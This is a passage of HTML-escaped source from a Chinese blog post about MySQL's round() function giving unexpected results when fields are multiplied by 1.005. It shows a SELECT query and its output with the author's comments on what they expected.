class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3.5000&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2.5000&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c3290614102-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c3290614102-7&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;row &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0033 seconds] --&gt;
&lt;p&gt;如果现在我们执行下面这个SQL，你觉得结果会是什么样的呢？&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f4b3d6c7869091540&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
SELECT
  round(field1 * field4),
  round(field2 * field4),
  round(field3 * field4),
  round(field1 * 1.005),
  round(field2 * 1.005),
  round(field3 * 1.005),
  round(field5),
  round(field6)
FROM test;&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6c7869091540-10&quot;&gt;10&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-1&quot;&gt;&lt;span class=&quot;crayon-e&quot;&gt;SELECT&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field1 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field2 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field3 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field1 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.005&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field2 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.005&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field3 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.005&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6c7869091540-10&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0014 seconds] --&gt;
&lt;p&gt;最初一直以为这样的结果肯定是都是&lt;strong&gt;101&lt;/strong&gt;，因为上面这六个取值结果都是对&lt;code&gt;100 * 1.005&lt;/code&gt;进行四舍五入，结果肯定都是&lt;code&gt;101&lt;/code&gt;才对，而后面两个肯定是&lt;strong&gt;4&lt;/strong&gt;和&lt;strong&gt;3&lt;/strong&gt;才对，但是最终的结果却是与设想的大相径庭&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f4b3d6cc781361111&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
*************************** 1. row ***************************
round(field1 * field4): 100
round(field2 * field4): 100
round(field3 * field4): 100
 round(field1 * 1.005): 101
 round(field2 * 1.005): 101
 round(field3 * 1.005): 101
         round(field5): 4
         round(field6): 2
1 row in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f4b3d6cc781361111-10&quot;&gt;10&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;row *&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field1 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field2 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-4&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field3 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field1 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.005&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;101&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field2 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.005&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;101&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;field3 *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1.005&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;101&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-8&quot;&gt;
